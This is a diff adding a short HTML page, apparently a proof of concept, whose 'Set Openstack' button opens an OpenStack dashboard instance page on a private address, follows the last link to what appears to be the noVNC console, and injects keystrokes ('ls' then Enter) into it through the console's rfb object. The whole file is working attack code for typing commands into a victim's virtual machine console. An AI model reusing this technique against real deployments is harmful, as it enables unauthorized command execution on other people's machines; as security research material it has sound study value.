@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<div id="accessing_iframe">
+<h2>Accessing Iframe</h2>
+<button id="bad-openstack" onclick="openWin()">Set Openstack</button>
+</div>
+<br>
+<br>
+
+<script>
+
+function openWin() {
+    var mywin = window.open("http://192.168.122.220/dashboard/project/instances/2ab65eac-2139-41d1-b608-016baccd67c0/", "hihi");
+    var abc;
+    {
+        setTimeout(function() {
+        x = mywin.document.getElementsByTagName("a");
+        abc = window.open(x[x.length - 1].href, "hiha");;
+        }, 20000);
+        setTimeout(function(){
+            abc.rfb.sendKey(0x6c, true);
+            abc.rfb.sendKey(0x73, true);
+            abc.rfb.sendKey(0xff0d, true);
+            },
+            30000);
+    }
+
+}
+</script>
